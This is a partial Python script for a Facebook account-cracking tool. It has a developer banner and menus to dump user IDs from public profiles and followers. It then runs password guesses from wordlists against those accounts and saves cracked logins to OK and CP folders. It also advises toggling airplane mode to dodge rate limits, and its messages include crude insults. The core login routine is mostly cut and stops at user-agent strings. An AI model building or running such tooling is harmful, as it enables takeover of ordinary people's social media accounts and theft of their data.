...
def banner():
	...
	sol()
	ban=''' 
â–ˆâ–ˆ   â–ˆâ–ˆ â–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ   â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ  â–ˆâ–ˆâ–ˆ    â–ˆâ–ˆ 
â–ˆâ–ˆ  â–ˆâ–ˆ  â–ˆâ–ˆ â–ˆâ–ˆ   â–ˆâ–ˆ â–ˆâ–ˆ    â–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆ   â–ˆâ–ˆ 
â–ˆâ–ˆâ–ˆâ–ˆâ–ˆ   â–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ  â–ˆâ–ˆ    â–ˆâ–ˆ â–ˆâ–ˆ â–ˆâ–ˆ  â–ˆâ–ˆ 
â–ˆâ–ˆ  â–ˆâ–ˆ  â–ˆâ–ˆ â–ˆâ–ˆ   â–ˆâ–ˆ â–ˆâ–ˆ    â–ˆâ–ˆ â–ˆâ–ˆ  â–ˆâ–ˆ â–ˆâ–ˆ 
â–ˆâ–ˆ   â–ˆâ–ˆ â–ˆâ–ˆ â–ˆâ–ˆ   â–ˆâ–ˆ  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ  â–ˆâ–ˆ   â–ˆâ–ˆâ–ˆâ–ˆ

ð’[âœ”] DEVELOPER :      AYUB HASAN KIRON
ð’[âœ”] FACEBOOK  :      AYUB HASAN KIRON
ð’[âœ”] WHATSAPP  :      01909765573 
ð’[âœ”] GITHUB    :      4YU8-H454N
ð’[âœ”] VERSION   :      1.0.0  '''
...
def login_lagi334():
	try:
		os.system('clear')
		banner()
		cetak(nel('\tÂ©Â©Â© Â©Â©Â© Extension Suggestions : [green]Cookiedough[white] Â©Â©Â©'))
		...
		print(f'  %s[%sx%s]%s LOGIN FAILED.....MAKE NEW COOKIES !!%s'%(x,k,x,m,x))
		exit()
def bot():
	try:
...
def menu(my_name,my_id):
	...
	gh = 'https://github.com/4YU8-H454N'
	cetak(nel('\tWelcome  [yellow]%s[white] '%(my_name)))
	print(f'â”œâ”€â”€> Your Idz : '+str(my_id))
	print(f'â”œâ”€â”€> Your Ip  : {ip}')
	print(f'â”œâ”€â”€> Github   : {gh}')
	print('|')
	print('â”œâ”€â”€> 1. Crack Public ')
	print('â”œâ”€â”€> 2. Crack Follower ')
	print('â”œâ”€â”€> 3. Report Tool ')
	print('â”œâ”€â”€> 4. Crack Results  ')
	print('â”œâ”€â”€> 0. Logout cookies        ')
	print('|')
	_____YT__Ibnz_____ = input('\râ”œâ”€â”€> Choose : ')
	if _____YT__Ibnz_____ in ['1']:
		dump_massal()
	elif _____YT__Ibnz_____ in ['2']:
		dump_follower()
	elif _____YT__Ibnz_____ in ['3']:
		error()
	elif _____YT__Ibnz_____ in ['4864']:
		crack_file()
	elif _____YT__Ibnz_____ in ['4']:
		result()
	elif _____YT__Ibnz_____ in ['746']:
		memek()
	elif _____YT__Ibnz_____ in ['0']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		print('â”œâ”€â”€> Sukses Logout+Hapus Kukis ')
		exit()
	else:
		print('â”œâ”€â”€> Choose Yang Bener Asu ')
		back()
def error():
	jalan(f'{sir}â”œâ”€â”€> wait you will be directed to Facebook  {x}')
	time.sleep(4)
	os.system("xdg-open https://www.facebook.com/4YU8.H454N")
	back()
#-----------------[ HASIL-CRACK ]-----------------#
def result():
	print(f'>> 1. Results {h}OK{x}  ')
	print(f'>> 2. Results {k}CP{x}  ')
	print('>> 3. Return	')
	kz = input(f'\n>> Choose : ')
	if kz in ['2']:
		...
		try:vin = os.listdir('OK')
			...
			back()
		if len(vin)==0:
			print('>> You do not have an Ok Idz ')
			time.sleep(2)
			back()
		else:
			cih = 0
...
def dump_massal():
	try:
		...
		exit()
	try:
		jum = int(input('â”œâ”€â”€> How many IDs do you want to add ? : '))
	except ValueError:
		print('â”œâ”€â”€> Something is wrong. ')
		exit()
	if jum<1 or jum>100:
		print('â”œâ”€â”€> Failed to Dump Idz ')
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input('â”œâ”€â”€> Enter the Facebook Uid '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
	...
	try:
		print('|')
		print(f'â”œâ”€â”€> Total Idz CollectedðŸ”¥{h}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
...
def grup1(urls):
	use = []
	ses = requests.Session()
	print(f'{x}â”œâ”€â”€> Sedang Mengumpulkan Idz ')
...
def crack_file():
	...
	if len(vin)==0:
		...
		try:geh = lol[geeh]
			...
			print(f'{k}â”œâ”€â”€> Choose Yang Bener Kontol {x}')
			time.sleep(3)
			back()
		try:lin = open('/sdcard/ALVINO-DUMP/'+geh,'r').read().splitlines()
		except:
			print('â”œâ”€â”€> File Not Found, Try Again Later ')
			time.sleep(2)
			back()
		for xid in lin:
			id.append(xid)
...
#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	print(f'{x}â”œâ”€â”€> 1. Crack Old Idz ')
	print('â”œâ”€â”€> 2. Crack New Idz ')
	print('â”œâ”€â”€> 3. Random ')
	print('|')
	hu = input('â”œâ”€â”€> Choose : ')
	if hu in ['1','01']:
		...
		print('â”œâ”€â”€> Choose Yang Bener Kontooll ')
		exit()
	...
	print('|')
	hc = input('â”œâ”€â”€> Choose : ')
	if hc in ['1','01']:
		method.append('mobile')
	elif hc in ['']:
		print('â”œâ”€â”€> Choose Yang Bener Kontol ')
		setting()
	elif hc in ['2','02']:
		method.append('free')
	elif hc in ['3','03']:
		...
		method.append('mobile')
	print('|')
	_jembot_ = input('â”œâ”€â”€> See the app to add to the ID ( Y/t ) ')
	if _jembot_ in ['']:
		print('â”œâ”€â”€> Choose the Right Cock ')
		back()
	elif _jembot_ in ['y','Y']:
		taplikasi.append('ya')
	else:
		taplikasi.append('no')
	pwplus=input('â”œâ”€â”€> Add Password Manual ( Y/t ) ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		cetak(nel('[[cyan]â€¢[white]] Enter an additional password of at least 6 characters\n[[cyan]â€¢[white]] Example :[green] kakak,ngentod,adik[white] '))
...
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	print(f'â”œâ”€â”€>{m}â€¢{k}â€¢{h}â€¢{x} Sedang Menggeser Matahari {m}â€¢{k}â€¢{h}â€¢{x} ')
	print('|')
	print(f'â”œâ”€â”€> {h}OK{x} Idz Result Saved In : {h}OK/%s {x}'%(okc))
	print(f'â”œâ”€â”€> {k}CP{x} Idz Result Saved In : {k}CP/%s {x}'%(cpc))
	print(f'â”œâ”€â”€> Turn on Airplane mode 5 seconds {m}1k{x} Idz\r')
	print('|')
	...
	print('|')
	print('â”œâ”€â”€>Continue Cracking Back ( Y/t ) ? ')
	woi = input('â”œâ”€â”€>Choose : ')
	if woi in ['y','Y']:
		back()
	else:
		print(f'\t{x}â”œâ”€â”€>{k} Good Bye Brother{x} << ')
		time.sleep(2)
		exit()
#--------------------[ METODE-B-API ]-----------------#
def crack(idf,pwv):
	...
	ua ='Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36'

	ua2 = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36'
